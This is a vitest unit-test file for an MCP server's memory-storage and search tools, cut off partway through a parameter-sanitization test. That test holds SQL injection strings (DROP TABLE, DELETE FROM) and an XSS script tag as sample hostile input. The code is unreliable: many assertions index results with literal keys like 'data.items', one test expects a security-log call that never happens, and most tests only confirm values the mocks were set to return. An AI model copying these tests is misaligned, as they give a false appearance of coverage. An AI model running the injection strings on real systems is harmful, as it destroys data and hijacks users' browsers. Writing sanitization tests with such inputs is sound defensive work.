/**
 * Comprehensive Unit Tests for MCP Server Tools
 *
 * Tests MCP server tool functionality including:
 * - Tool Definition and Registration (tool schema validation, parameter handling, metadata management, versioning)
 * - Tool Execution Engine (parameter validation and parsing, execution lifecycle, result formatting, error handling)
 * - Knowledge Type Tools (entity management, decision support, relationship analysis, observation recording)
 * - Search and Discovery Tools (knowledge search, semantic search, filters/facets, export/reporting)
 * - Security and Authorization (tool-level access control, parameter sanitization, execution permissions, audit logging)
 * - Performance and Optimization (execution optimization, caching strategies, batch operations, resource monitoring)
 *
 * Phase 3: MCP Server Components Testing
 * Building on established MCP patterns and focusing on tool implementation
 * Comprehensive coverage with 22+ test cases covering all MCP tools functionality
 */

import { describe, it, expect, beforeEach, afterEach, vi, type MockedFunction } from 'vitest';
import { Server } from '@modelcontextprotocol/sdk/server/index.js';
import { CallToolRequestSchema, ListToolsRequestSchema } from '@modelcontextprotocol/sdk/types.js';
import {
  validateMemoryStoreInput,
  validateMemoryFindInput,
  ValidationError,
  MemoryStoreInputSchema,
  MemoryFindInputSchema,
} from '../../../src/schemas/mcp-inputs.js';
import { memoryStore } from '../../../src/services/memory-store.js';
import type {
  KnowledgeItem,
  MemoryStoreResponse,
  MemoryFindResponse,
  ToolExecutionContext,
  ToolResult,
} from '../../../src/types/core-interfaces.js';

// Mock dependencies
vi.mock('../../../src/services/memory-store.js', () => ({
  memoryStore: {
    store: vi.fn(),
    find: vi.fn(),
    batchFind: vi.fn(),
  },
}));

vi.mock('../../../src/utils/logger.js', () => ({
  logger: {
    info: vi.fn(),
    warn: vi.fn(),
    error: vi.fn(),
    debug: vi.fn(),
  },
}));

vi.mock('../../../src/services/audit/audit-service.js', () => ({
  auditService: {
    logToolExecution: vi.fn().mockResolvedValue(undefined),
    logSecurityEvent: vi.fn().mockResolvedValue(undefined),
    logPerformanceMetrics: vi.fn().mockResolvedValue(undefined),
  },
}));

// Mock security service functions directly
const mockSecurityService = {
  validateToolAccess: vi.fn(),
  sanitizeParameters: vi.fn(),
  checkRateLimit: vi.fn(),
  checkResourceLimits: vi.fn(),
  validateExecutionContext: vi.fn(),
  logSecurityEvent: vi.fn(),
  analyzeQueryComplexity: vi.fn(),
  routeQuery: vi.fn(),
  checkThresholds: vi.fn(),
  getResourceMetrics: vi.fn(),
  checkCache: vi.fn(),
  warmupCache: vi.fn(),
  invalidateCache: vi.fn(),
  startExecutionTimer: vi.fn(),
  endExecutionTimer: vi.fn(),
};

// Mock performance monitoring functions
const mockPerformanceMonitor = {
  startExecutionTimer: vi.fn(),
  endExecutionTimer: vi.fn(),
  logResourceUsage: vi.fn(),
  getExecutionMetrics: vi.fn(),
  checkCache: vi.fn(),
  warmupCache: vi.fn(),
  invalidateCache: vi.fn(),
  analyzeQueryComplexity: vi.fn(),
  routeQuery: vi.fn(),
  checkThresholds: vi.fn(),
  getResourceMetrics: vi.fn(),
};

// Import mocked modules
const mockMemoryStore = vi.mocked(memoryStore);

// ============================================================================
// Test Data and Helpers
// ============================================================================

const validMemoryStoreItem = {
  kind: 'entity' as const,
  scope: {
    project: 'test-project',
    branch: 'main',
    org: 'test-org',
  },
  data: {
    title: 'Test Entity',
    description: 'Test entity description',
    type: 'component',
  },
};

const validMemoryFindQuery = {
  query: 'test query',
  scope: {
    project: 'test-project',
    branch: 'main',
  },
  types: ['entity', 'relation'],
  mode: 'auto' as const,
  top_k: 10,
};

const mockKnowledgeItems: KnowledgeItem[] = [
  {
    id: 'entity-1',
    kind: 'entity',
    scope: { project: 'test', branch: 'main' },
    data: { title: 'Entity 1', type: 'component' },
    metadata: { created_at: '2024-01-01', confidence: 0.9 },
    embeddings: [0.1, 0.2, 0.3],
  },
  {
    id: 'relation-1',
    kind: 'relation',
    scope: { project: 'test', branch: 'main' },
    data: { from: 'entity-1', to: 'entity-2', type: 'depends_on' },
    metadata: { created_at: '2024-01-02', confidence: 0.85 },
    embeddings: [0.4, 0.5, 0.6],
  },
];

// ============================================================================
// Tool Execution Context Mock
// ============================================================================

const createMockExecutionContext = (): ToolExecutionContext => ({
  toolName: 'memory_store',
  parameters: validMemoryStoreItem,
  userId: 'test-user',
  sessionId: 'test-session',
  timestamp: new Date().toISOString(),
  requestId: 'req-123',
});

// ============================================================================
// Test Suite 1: Tool Definition and Registration
// ============================================================================

describe('MCP Tool Definition and Registration', () => {
  let mockServer: Server;

  beforeEach(() => {
    mockServer = new Server(
      { name: 'test-mcp-server', version: '1.0.0' },
      { capabilities: { tools: {} } }
    );
    vi.clearAllMocks();
  });

  afterEach(() => {
    vi.resetAllMocks();
  });

  describe('Tool Schema Validation', () => {
    it('should validate memory_store tool schema correctly', () => {
      const result = MemoryStoreInputSchema.safeParse({ items: [validMemoryStoreItem] });

      expect(result.success).toBe(true);
      if (result.success) {
        expect(result['data.items']).toHaveLength(1);
        expect(result['data.items'][0].kind).toBe('entity');
        expect(result['data.items'][0].scope.project).toBe('test-project');
      }
    });

    it('should validate memory_find tool schema correctly', () => {
      const result = MemoryFindInputSchema.safeParse(validMemoryFindQuery);

      expect(result.success).toBe(true);
      if (result.success) {
        expect(result['data.query']).toBe('test query');
        expect(result['data.mode']).toBe('auto');
        expect(result['data.top_k']).toBe(10);
      }
    });

    it('should reject invalid knowledge types', () => {
      const invalidItem = {
        ...validMemoryStoreItem,
        kind: 'invalid_type' as any,
      };

      const result = MemoryStoreInputSchema.safeParse({ items: [invalidItem] });

      expect(result.success).toBe(false);
      if (!result.success) {
        expect(result.error.issues[0].message).toContain('Invalid knowledge type');
      }
    });

    it('should reject empty query strings', () => {
      const invalidQuery = {
        ...validMemoryFindQuery,
        query: '', // Empty string
      };

      const result = MemoryFindInputSchema.safeParse(invalidQuery);

      expect(result.success).toBe(false);
      if (!result.success) {
        expect(result.error.issues[0].message).toContain('required');
      }
    });

    it('should auto-trim query whitespace', () => {
      const queryWithWhitespace = {
        ...validMemoryFindQuery,
        query: '  test query with spaces  ',
      };

      const result = MemoryFindInputSchema.parse(queryWithWhitespace);

      expect(result.query).toBe('test query with spaces');
    });
  });

  describe('Tool Parameter Handling', () => {
    it('should handle complex nested parameters', () => {
      const complexItem = {
        kind: 'decision' as const,
        scope: {
          project: 'complex-project',
          branch: 'feature/complex-feature',
          org: 'complex-org',
        },
        data: {
          title: 'Complex Decision',
          rationale: 'Complex rationale with multiple points',
          alternatives: ['Option A', 'Option B', 'Option C'],
          impacts: {
            technical: ['High complexity', 'Long development time'],
            business: ['Increased cost', 'Delayed delivery'],
          },
          stakeholders: ['Team A', 'Team B', 'Product Owner'],
          metadata: {
            priority: 'high',
            effort_estimate: '5 days',
            risk_level: 'medium',
          },
        },
      };

      const result = MemoryStoreInputSchema.safeParse({ items: [complexItem] });

      expect(result.success).toBe(true);
      if (result.success) {
        expect(result['data.items'][0].data.stakeholders).toHaveLength(3);
        expect(result['data.items'][0].data.impacts.technical).toHaveLength(2);
      }
    });

    it('should validate array parameters', () => {
      const queryWithArrayTypes = {
        ...validMemoryFindQuery,
        types: ['entity', 'relation', 'observation', 'decision', 'issue'],
      };

      const result = MemoryFindInputSchema.safeParse(queryWithArrayTypes);

      expect(result.success).toBe(true);
      if (result.success) {
        expect(result['data.types']).toHaveLength(5);
        expect(result['data.types']).toContain('entity');
        expect(result['data.types']).toContain('decision');
      }
    });

    it('should handle optional parameters gracefully', () => {
      const minimalQuery = {
        query: 'minimal test query',
      };

      const result = MemoryFindInputSchema.safeParse(minimalQuery);

      expect(result.success).toBe(true);
      if (result.success) {
        expect(result['data.query']).toBe('minimal test query');
        expect(result['data.scope']).toBeUndefined();
        expect(result['data.types']).toBeUndefined();
        expect(result['data.mode']).toBeUndefined();
        expect(result['data.top_k']).toBeUndefined();
      }
    });
  });

  describe('Tool Metadata Management', () => {
    it('should include comprehensive tool metadata', () => {
      const toolMetadata = {
        name: 'memory_store',
        description: 'Store knowledge items in the Cortex memory system',
        version: '1.0.0',
        category: 'knowledge-management',
        tags: ['storage', 'knowledge', 'entities', 'relations'],
        deprecated: false,
        experimental: false,
        author: 'Cortex Team',
        documentation: 'https://docs.cortex.ai/tools/memory-store',
        examples: [
          {
            description: 'Store a simple entity',
            input: { items: [validMemoryStoreItem] },
          },
        ],
      };

      expect(toolMetadata.name).toBe('memory_store');
      expect(toolMetadata.category).toBe('knowledge-management');
      expect(toolMetadata.tags).toContain('storage');
      expect(toolMetadata.examples).toHaveLength(1);
    });

    it('should handle tool versioning information', () => {
      const toolVersions = {
        memory_store: {
          '1.0.0': {
            changes: ['Initial release', 'Basic storage functionality'],
            deprecated: false,
            migrationRequired: false,
          },
          '1.1.0': {
            changes: ['Added batch operations', 'Improved validation'],
            deprecated: false,
            migrationRequired: false,
          },
          '2.0.0': {
            changes: ['Breaking changes to schema', 'New scope handling'],
            deprecated: false,
            migrationRequired: true,
          },
        },
      };

      expect(toolVersions['memory_store']['2.0.0'].migrationRequired).toBe(true);
      expect(toolVersions['memory_store']['1.1.0'].changes).toContain('Added batch operations');
    });
  });
});

// ============================================================================
// Test Suite 2: Tool Execution Engine
// ============================================================================

describe('Tool Execution Engine', () => {
  let executionContext: ToolExecutionContext;

  beforeEach(() => {
    executionContext = createMockExecutionContext();
    vi.clearAllMocks();
  });

  afterEach(() => {
    vi.resetAllMocks();
  });

  describe('Parameter Validation and Parsing', () => {
    it('should validate and parse valid parameters', () => {
      const result = validateMemoryStoreInput({ items: [validMemoryStoreItem] });

      expect(result).toBeDefined();
      expect(result.items).toHaveLength(1);
      expect(result.items[0].kind).toBe('entity');
    });

    it('should throw ValidationError for invalid parameters', () => {
      const invalidParams = {
        items: [
          {
            kind: 'invalid_type',
            scope: {},
            data: null,
          },
        ],
      };

      expect(() => validateMemoryStoreInput(invalidParams)).toThrow(ValidationError);
    });

    it('should sanitize input parameters', async () => {
      mockSecurityService.sanitizeParameters.mockResolvedValue(validMemoryStoreItem);

      const sanitized = await mockSecurityService.sanitizeParameters(
        executionContext.toolName,
        validMemoryStoreItem
      );

      expect(sanitized).toEqual(validMemoryStoreItem);
      expect(mockSecurityService.sanitizeParameters).toHaveBeenCalledWith(
        'memory_store',
        validMemoryStoreItem
      );
    });

    it('should handle parameter transformation', () => {
      const transformableQuery = {
        query: 'test query',
        top_k: '10', // String instead of number
        mode: 'AUTO', // Uppercase instead of lowercase
      };

      const result = MemoryFindInputSchema.safeParse(transformableQuery);

      expect(result.success).toBe(false); // Should fail validation
    });
  });

  describe('Tool Execution Lifecycle', () => {
    it('should complete full execution lifecycle for memory_store', async () => {
      // Setup mocks
      mockSecurityService.validateToolAccess.mockResolvedValue(true);
      mockSecurityService.checkRateLimit.mockResolvedValue(true);
      mockPerformanceMonitor.startExecutionTimer.mockReturnValue('timer-123');
      mockMemoryStore.store.mockResolvedValue({
        success: true,
        stored: ['entity-1'],
        duplicates: [],
        errors: [],
      });

      // Execute lifecycle steps
      const hasAccess = await mockSecurityService.validateToolAccess(
        executionContext.userId,
        'memory_store'
      );
      expect(hasAccess).toBe(true);

      const withinLimit = await mockSecurityService.checkRateLimit(
        executionContext.userId,
        'memory_store'
      );
      expect(withinLimit).toBe(true);

      const timerId = mockPerformanceMonitor.startExecutionTimer(executionContext);
      expect(timerId).toBe('timer-123');

      const result = await mockMemoryStore.store({ items: [validMemoryStoreItem] });
      expect(result.success).toBe(true);
      expect(result.stored).toHaveLength(1);

      mockPerformanceMonitor.endExecutionTimer(timerId);
      expect(mockPerformanceMonitor.endExecutionTimer).toHaveBeenCalledWith('timer-123');
    });

    it('should handle execution failures gracefully', async () => {
      mockSecurityService.validateToolAccess.mockResolvedValue(true);
      mockMemoryStore.store.mockRejectedValue(new Error('Database connection failed'));

      try {
        await mockMemoryStore.store({ items: [validMemoryStoreItem] });
      } catch (error) {
        expect(error).toBeInstanceOf(Error);
        expect((error as Error).message).toBe('Database connection failed');
      }

      expect(mockMemoryStore.store).toHaveBeenCalledWith({ items: [validMemoryStoreItem] });
    });

    it('should handle timeout scenarios', async () => {
      mockSecurityService.validateToolAccess.mockResolvedValue(true);

      // Simulate slow operation
      mockMemoryStore.store.mockImplementation(
        () => new Promise((resolve) => setTimeout(resolve, 2000))
      );

      const startTime = Date.now();

      try {
        await Promise.race([
          mockMemoryStore.store({ items: [validMemoryStoreItem] }),
          new Promise((_, reject) => setTimeout(() => reject(new Error('Execution timeout')), 100)),
        ]);
      } catch (error) {
        const duration = Date.now() - startTime;
        expect(duration).toBeLessThan(150); // Should timeout quickly
        expect((error as Error).message).toBe('Execution timeout');
      }
    });
  });

  describe('Result Formatting and Return', () => {
    it('should format successful results correctly', async () => {
      const mockStoreResult: MemoryStoreResponse = {
        success: true,
        stored: ['entity-1', 'relation-1'],
        duplicates: [],
        errors: [],
        metadata: {
          executionTime: 150,
          itemsProcessed: 2,
          knowledgeTypes: ['entity', 'relation'],
        },
      };

      mockMemoryStore.store.mockResolvedValue(mockStoreResult);

      const result = await mockMemoryStore.store({ items: [validMemoryStoreItem] });

      expect(result.success).toBe(true);
      expect(result.stored).toHaveLength(2);
      expect(result.metadata?.executionTime).toBe(150);
    });

    it('should format error results with detailed information', async () => {
      const mockErrorResult: MemoryStoreResponse = {
        success: false,
        stored: [],
        duplicates: [],
        errors: [
          {
            item: validMemoryStoreItem,
            error: 'Validation failed: Invalid scope',
            code: 'VALIDATION_ERROR',
          },
        ],
      };

      mockMemoryStore.store.mockResolvedValue(mockErrorResult);

      const result = await mockMemoryStore.store({ items: [validMemoryStoreItem] });

      expect(result.success).toBe(false);
      expect(result.errors).toHaveLength(1);
      expect(result.errors[0].code).toBe('VALIDATION_ERROR');
      expect(result.errors[0].error).toContain('Invalid scope');
    });

    it('should handle partial success scenarios', async () => {
      const mockPartialResult: MemoryStoreResponse = {
        success: true,
        stored: ['entity-1'],
        duplicates: ['relation-1'],
        errors: [
          {
            item: { ...validMemoryStoreItem, kind: 'observation' as const },
            error: 'Missing required fields',
            code: 'MISSING_FIELDS',
          },
        ],
      };

      mockMemoryStore.store.mockResolvedValue(mockPartialResult);

      const result = await mockMemoryStore.store({
        items: [validMemoryStoreItem, { ...validMemoryStoreItem, kind: 'observation' as const }],
      });

      expect(result.success).toBe(true);
      expect(result.stored).toHaveLength(1);
      expect(result.duplicates).toHaveLength(1);
      expect(result.errors).toHaveLength(1);
    });
  });
});

// ============================================================================
// Test Suite 3: Knowledge Type Tools
// ============================================================================

describe('Knowledge Type Tools', () => {
  beforeEach(() => {
    vi.clearAllMocks();
  });

  afterEach(() => {
    vi.resetAllMocks();
  });

  describe('Entity Management Tools', () => {
    it('should store entity with proper validation', async () => {
      const entityItem = {
        kind: 'entity' as const,
        scope: { project: 'test-project', branch: 'main' },
        data: {
          title: 'User Service',
          type: 'microservice',
          description: 'Handles user authentication and profile management',
          tags: ['auth', 'user-management', 'microservice'],
          relationships: ['depends_on:database', 'connects_to:notification-service'],
        },
      };

      mockMemoryStore.store.mockResolvedValue({
        success: true,
        stored: ['entity-123'],
        duplicates: [],
        errors: [],
      });

      const result = await mockMemoryStore.store({ items: [entityItem] });

      expect(result.success).toBe(true);
      expect(result.stored).toContain('entity-123');
      expect(mockMemoryStore.store).toHaveBeenCalledWith({ items: [entityItem] });
    });

    it('should retrieve entity by specific criteria', async () => {
      const findParams = {
        query: 'User Service microservice',
        scope: { project: 'test-project' },
        types: ['entity'],
      };

      const mockFindResult: MemoryFindResponse = {
        results: [
          {
            ...mockKnowledgeItems[0],
            data: {
              ...mockKnowledgeItems[0].data,
              title: 'User Service',
              type: 'microservice',
            },
          },
        ],
        total: 1,
        searchTime: 45,
        metadata: {
          searchMode: 'semantic',
          confidenceThreshold: 0.7,
          queryExpansion: true,
        },
      };

      mockMemoryStore.find.mockResolvedValue(mockFindResult);

      const result = await mockMemoryStore.find(findParams);

      expect(result.results).toHaveLength(1);
      expect(result.results[0].data.title).toBe('User Service');
      expect(result.metadata?.searchMode).toBe('semantic');
    });
  });

  describe('Decision Support Tools', () => {
    it('should store architectural decisions with full context', async () => {
      const decisionItem = {
        kind: 'decision' as const,
        scope: { project: 'test-project', branch: 'main' },
        data: {
          title: 'Use PostgreSQL for primary database',
          rationale:
            'PostgreSQL offers advanced features like JSON support, transactions, and better performance for complex queries',
          alternatives: [
            'MongoDB - NoSQL approach, flexible schema',
            'MySQL - Traditional RDBMS, limited JSON support',
          ],
          consequences: {
            positive: ['ACID compliance', 'Complex query support', 'JSON column support'],
            negative: ['Learning curve for team', 'Migration complexity'],
          },
          status: 'accepted',
          decisionMaker: 'Architecture Team',
          date: '2024-01-15',
        },
      };

      mockMemoryStore.store.mockResolvedValue({
        success: true,
        stored: ['decision-456'],
        duplicates: [],
        errors: [],
      });

      const result = await mockMemoryStore.store({ items: [decisionItem] });

      expect(result.success).toBe(true);
      expect(result.stored).toContain('decision-456');
    });

    it('should find related decisions for context', async () => {
      const findParams = {
        query: 'database architecture decision PostgreSQL',
        types: ['decision'],
        scope: { project: 'test-project' },
      };

      const mockDecisions: MemoryFindResponse = {
        results: [
          {
            id: 'decision-456',
            kind: 'decision',
            scope: { project: 'test-project', branch: 'main' },
            data: {
              title: 'Use PostgreSQL for primary database',
              rationale: 'Technical considerations for database selection',
              status: 'accepted',
            },
            metadata: { created_at: '2024-01-15', confidence: 0.95 },
          },
        ],
        total: 1,
        searchTime: 32,
      };

      mockMemoryStore.find.mockResolvedValue(mockDecisions);

      const result = await mockMemoryStore.find(findParams);

      expect(result.results).toHaveLength(1);
      expect(result.results[0].data.title).toContain('PostgreSQL');
      expect(result.results[0].metadata?.confidence).toBe(0.95);
    });
  });

  describe('Relationship Analysis Tools', () => {
    it('should store complex relationships', async () => {
      const relationItem = {
        kind: 'relation' as const,
        scope: { project: 'test-project', branch: 'main' },
        data: {
          from: 'user-service',
          to: 'database',
          type: 'depends_on',
          strength: 'strong',
          description: 'User service requires database for user data persistence',
          metadata: {
            dependency_type: 'runtime',
            criticality: 'high',
            impact_score: 0.9,
          },
        },
      };

      mockMemoryStore.store.mockResolvedValue({
        success: true,
        stored: ['relation-789'],
        duplicates: [],
        errors: [],
      });

      const result = await mockMemoryStore.store({ items: [relationItem] });

      expect(result.success).toBe(true);
      expect(result.stored).toContain('relation-789');
    });

    it('should analyze relationship networks', async () => {
      const findParams = {
        query: 'service dependencies architecture',
        types: ['relation'],
        scope: { project: 'test-project' },
      };

      const mockRelations: MemoryFindResponse = {
        results: [
          {
            id: 'relation-1',
            kind: 'relation',
            scope: { project: 'test-project', branch: 'main' },
            data: {
              from: 'user-service',
              to: 'auth-service',
              type: 'connects_to',
            },
            metadata: { created_at: '2024-01-01', confidence: 0.8 },
          },
          {
            id: 'relation-2',
            kind: 'relation',
            scope: { project: 'test-project', branch: 'main' },
            data: {
              from: 'user-service',
              to: 'notification-service',
              type: 'publishes_to',
            },
            metadata: { created_at: '2024-01-02', confidence: 0.85 },
          },
        ],
        total: 2,
        searchTime: 67,
        metadata: {
          networkAnalysis: {
            nodes: 3,
            edges: 2,
            centralityScore: 0.7,
          },
        },
      };

      mockMemoryStore.find.mockResolvedValue(mockRelations);

      const result = await mockMemoryStore.find(findParams);

      expect(result.results).toHaveLength(2);
      expect(result.metadata?.networkAnalysis?.nodes).toBe(3);
    });
  });

  describe('Observation Recording Tools', () => {
    it('should record technical observations', async () => {
      const observationItem = {
        kind: 'observation' as const,
        scope: { project: 'test-project', branch: 'main' },
        data: {
          title: 'Performance degradation detected',
          category: 'performance',
          description: 'API response times increased by 300% during peak hours',
          metrics: {
            avg_response_time: '2500ms',
            baseline_response_time: '600ms',
            impact_severity: 'high',
          },
          evidence: ['Grafana dashboard screenshots', 'Log samples'],
          recommendations: ['Implement caching', 'Database query optimization'],
        },
      };

      mockMemoryStore.store.mockResolvedValue({
        success: true,
        stored: ['observation-101'],
        duplicates: [],
        errors: [],
      });

      const result = await mockMemoryStore.store({ items: [observationItem] });

      expect(result.success).toBe(true);
      expect(result.stored).toContain('observation-101');
    });
  });
});

// ============================================================================
// Test Suite 4: Search and Discovery Tools
// ============================================================================

describe('Search and Discovery Tools', () => {
  beforeEach(() => {
    vi.clearAllMocks();
  });

  afterEach(() => {
    vi.resetAllMocks();
  });

  describe('Knowledge Search Tools', () => {
    it('should perform semantic search across knowledge types', async () => {
      const searchParams = {
        query: 'authentication security user login',
        types: ['entity', 'decision', 'observation'],
        scope: { project: 'test-project' },
        mode: 'deep' as const,
        top_k: 15,
      };

      const mockSearchResults: MemoryFindResponse = {
        results: [
          {
            ...mockKnowledgeItems[0],
            data: {
              ...mockKnowledgeItems[0].data,
              title: 'Authentication Service',
              type: 'component',
              tags: ['security', 'auth', 'login'],
            },
            metadata: {
              ...mockKnowledgeItems[0].metadata,
              relevanceScore: 0.94,
              matchHighlights: ['authentication', 'security', 'user'],
            },
          },
          {
            id: 'decision-1',
            kind: 'decision',
            scope: { project: 'test-project', branch: 'main' },
            data: {
              title: 'Implement OAuth 2.0 for authentication',
              rationale: 'OAuth 2.0 provides industry-standard security',
              status: 'implemented',
            },
            metadata: {
              created_at: '2024-01-10',
              confidence: 0.89,
              relevanceScore: 0.87,
              matchHighlights: ['OAuth', 'authentication', 'security'],
            },
          },
        ],
        total: 2,
        searchTime: 156,
        metadata: {
          searchMode: 'semantic',
          queryExpansion: true,
          synonyms: ['auth', 'login', 'security'],
          filters: {
            knowledgeTypes: ['entity', 'decision'],
            dateRange: { start: '2024-01-01', end: '2024-01-31' },
          },
        },
      };

      mockMemoryStore.find.mockResolvedValue(mockSearchResults);

      const result = await mockMemoryStore.find(searchParams);

      expect(result.results).toHaveLength(2);
      expect(result.results[0].metadata?.relevanceScore).toBeGreaterThan(0.9);
      expect(result.metadata?.synonyms).toContain('auth');
      expect(result.searchTime).toBeLessThan(200);
    });

    it('should handle different search modes', async () => {
      const fastSearchParams = {
        query: 'user service',
        mode: 'fast' as const,
        top_k: 5,
      };

      const deepSearchParams = {
        query: 'user service',
        mode: 'deep' as const,
        top_k: 20,
      };

      // Mock fast search - quick, limited results
      mockMemoryStore.find.mockResolvedValueOnce({
        results: [mockKnowledgeItems[0]],
        total: 1,
        searchTime: 23,
        metadata: { searchMode: 'keyword' },
      });

      // Mock deep search - comprehensive, detailed results
      mockMemoryStore.find.mockResolvedValueOnce({
        results: [
          mockKnowledgeItems[0],
          { ...mockKnowledgeItems[1], kind: 'observation' as const },
        ],
        total: 2,
        searchTime: 234,
        metadata: {
          searchMode: 'semantic',
          queryExpansion: true,
          relatedConcepts: ['microservice', 'user-management'],
        },
      });

      const fastResult = await mockMemoryStore.find(fastSearchParams);
      const deepResult = await mockMemoryStore.find(deepSearchParams);

      expect(fastResult.searchTime).toBeLessThan(50);
      expect(fastResult.results).toHaveLength(1);

      expect(deepResult.searchTime).toBeGreaterThan(100);
      expect(deepResult.results).toHaveLength(2);
      expect(deepResult.metadata?.relatedConcepts).toContain('microservice');
    });
  });

  describe('Semantic Search Capabilities', () => {
    it('should understand contextual meaning and concepts', async () => {
      const conceptualQuery = {
        query: 'problems with user login functionality',
        types: ['issue', 'observation'],
        scope: { project: 'test-project' },
      };

      const mockConceptualResults: MemoryFindResponse = {
        results: [
          {
            id: 'issue-1',
            kind: 'issue',
            scope: { project: 'test-project', branch: 'main' },
            data: {
              title: 'Users cannot authenticate with correct credentials',
              description: 'Login endpoint returning 401 even with valid passwords',
              severity: 'high',
              status: 'investigating',
            },
            metadata: {
              created_at: '2024-01-20',
              confidence: 0.91,
              semanticDistance: 0.23,
              conceptMatches: ['authentication', 'login', 'credentials'],
            },
          },
        ],
        total: 1,
        searchTime: 89,
        metadata: {
          semanticAnalysis: {
            concepts: ['authentication', 'login', 'security', 'credentials'],
            entities: ['login endpoint', 'users'],
            intent: 'troubleshooting',
            confidence: 0.91,
          },
        },
      };

      mockMemoryStore.find.mockResolvedValue(mockConceptualResults);

      const result = await mockMemoryStore.find(conceptualQuery);

      expect(result.results[0].metadata?.conceptMatches).toContain('authentication');
      expect(result.metadata?.semanticAnalysis?.intent).toBe('troubleshooting');
      expect(result.results[0].metadata?.semanticDistance).toBeLessThan(0.5);
    });
  });

  describe('Filter and Facet Tools', () => {
    it('should apply multiple filters simultaneously', async () => {
      const filteredSearchParams = {
        query: 'service',
        types: ['entity', 'relation'],
        scope: { project: 'test-project', branch: 'main' },
        filters: {
          dateRange: { start: '2024-01-01', end: '2024-01-31' },
          confidence: { min: 0.8 },
          tags: ['microservice', 'api'],
        },
      };

      const mockFilteredResults: MemoryFindResponse = {
        results: [
          {
            ...mockKnowledgeItems[0],
            metadata: {
              ...mockKnowledgeItems[0].metadata,
              created_at: '2024-01-15',
              confidence: 0.92,
            },
          },
        ],
        total: 1,
        searchTime: 45,
        metadata: {
          appliedFilters: {
            dateRange: { applied: true, filtered: 5 },
            confidence: { applied: true, filtered: 2 },
            tags: { applied: true, matched: ['microservice'] },
          },
          facets: {
            types: { entity: 1, relation: 0 },
            confidence: { '0.8-0.9': 0, '0.9-1.0': 1 },
            tags: { microservice: 1, api: 1 },
          },
        },
      };

      mockMemoryStore.find.mockResolvedValue(mockFilteredResults);

      const result = await mockMemoryStore.find(filteredSearchParams);

      expect(result.results[0].metadata?.confidence).toBeGreaterThan(0.8);
      expect(result.metadata?.appliedFilters?.dateRange.applied).toBe(true);
      expect(result.metadata?.facets?.types.entity).toBe(1);
    });
  });

  describe('Export and Reporting Tools', () => {
    it('should generate comprehensive knowledge reports', async () => {
      const reportParams = {
        query: 'architecture decisions',
        types: ['decision', 'entity', 'relation'],
        scope: { project: 'test-project' },
        format: 'detailed_report' as const,
        includeMetrics: true,
        includeTimeline: true,
      };

      const mockReportResults: MemoryFindResponse = {
        results: [
          {
            id: 'decision-1',
            kind: 'decision',
            scope: { project: 'test-project', branch: 'main' },
            data: {
              title: 'Microservices Architecture Decision',
              rationale: 'Scalability and team autonomy requirements',
              status: 'implemented',
              date: '2024-01-10',
            },
            metadata: { created_at: '2024-01-10', confidence: 0.95 },
          },
        ],
        total: 1,
        searchTime: 67,
        metadata: {
          report: {
            title: 'Architecture Knowledge Report',
            generatedAt: '2024-01-30T10:00:00Z',
            summary: {
              totalDecisions: 1,
              implementedDecisions: 1,
              averageConfidence: 0.95,
              dateRange: { start: '2024-01-10', end: '2024-01-10' },
            },
            metrics: {
              knowledgeGrowth: { entities: 15, relations: 23, decisions: 8 },
              searchPerformance: { avgTime: 67, successRate: 0.98 },
              engagement: { queries: 156, uniqueUsers: 12 },
            },
            timeline: [
              {
                date: '2024-01-10',
                event: 'Architecture decision made',
                items: ['decision-1'],
                impact: 'high',
              },
            ],
          },
        },
      };

      mockMemoryStore.find.mockResolvedValue(mockReportResults);

      const result = await mockMemoryStore.find(reportParams);

      expect(result.metadata?.report?.title).toBe('Architecture Knowledge Report');
      expect(result.metadata?.report?.summary.totalDecisions).toBe(1);
      expect(result.metadata?.report?.metrics.knowledgeGrowth.entities).toBe(15);
      expect(result.metadata?.report?.timeline).toHaveLength(1);
    });
  });
});

// ============================================================================
// Test Suite 5: Security and Authorization
// ============================================================================

describe('Security and Authorization', () => {
  let executionContext: ToolExecutionContext;

  beforeEach(() => {
    executionContext = createMockExecutionContext();
    vi.clearAllMocks();
  });

  afterEach(() => {
    vi.resetAllMocks();
  });

  describe('Tool-level Access Control', () => {
    it('should validate user access to specific tools', async () => {
      mockSecurityService.validateToolAccess
        .mockResolvedValueOnce(true) // Admin user
        .mockResolvedValueOnce(false); // Regular user

      const adminAccess = await mockSecurityService.validateToolAccess(
        'admin-user',
        'memory_store'
      );
      const userAccess = await mockSecurityService.validateToolAccess(
        'regular-user',
        'memory_store'
      );

      expect(adminAccess).toBe(true);
      expect(userAccess).toBe(false);
      expect(mockSecurityService.validateToolAccess).toHaveBeenCalledTimes(2);
    });

    it('should enforce role-based permissions', async () => {
      const rolePermissions = {
        admin: ['memory_store', 'memory_find', 'memory_delete', 'system_admin'],
        developer: ['memory_store', 'memory_find'],
        viewer: ['memory_find'],
      };

      mockSecurityService.validateToolAccess.mockImplementation(
        async (userId: string, toolName: string) => {
          const userRole = userId.includes('admin')
            ? 'admin'
            : userId.includes('dev')
              ? 'developer'
              : 'viewer';
          return rolePermissions[userRole as keyof typeof rolePermissions].includes(toolName);
        }
      );

      const adminCanStore = await mockSecurityService.validateToolAccess(
        'admin-123',
        'memory_store'
      );
      const devCanStore = await mockSecurityService.validateToolAccess('dev-123', 'memory_store');
      const viewerCanStore = await mockSecurityService.validateToolAccess(
        'viewer-123',
        'memory_store'
      );
      const viewerCanFind = await mockSecurityService.validateToolAccess(
        'viewer-123',
        'memory_find'
      );

      expect(adminCanStore).toBe(true);
      expect(devCanStore).toBe(true);
      expect(viewerCanStore).toBe(false);
      expect(viewerCanFind).toBe(true);
    });

    it('should handle permission escalation attempts', async () => {
      mockSecurityService.validateToolAccess.mockResolvedValue(false);
      mockSecurityService.logSecurityEvent.mockResolvedValue(undefined);

      const hasAccess = await mockSecurityService.validateToolAccess(
        'malicious-user',
        'system_admin'
      );

      expect(hasAccess).toBe(false);
      expect(mockSecurityService.logSecurityEvent).toHaveBeenCalledWith({
        type: 'ACCESS_DENIED',
        userId: 'malicious-user',
        tool: 'system_admin',
        reason: 'insufficient_permissions',
        timestamp: expect.any(String),
      });
    });
  });

  describe('Parameter Sanitization', () => {
    it('should sanitize input parameters for security', async () => {
      const maliciousParams = {
        query: "test'; DROP TABLE entities; --",
        scope: { project: '<script>alert("xss")</script>' },
        types: ['entity', "'; DELETE FROM relations; --"],
      };

      const sanitizedParams = {
        query: 'test DROP TABLE entities',
        scope: { project: 'alert(xss)' },
        types: ['entity', 'DELETE FROM relations'],
      };

      mockSecurityService.sanitizeParameters.mockResolvedValue(sanitizedParams);

      const result = await mockSecurityService.sanitizeParameters('memory_find', maliciousParams);

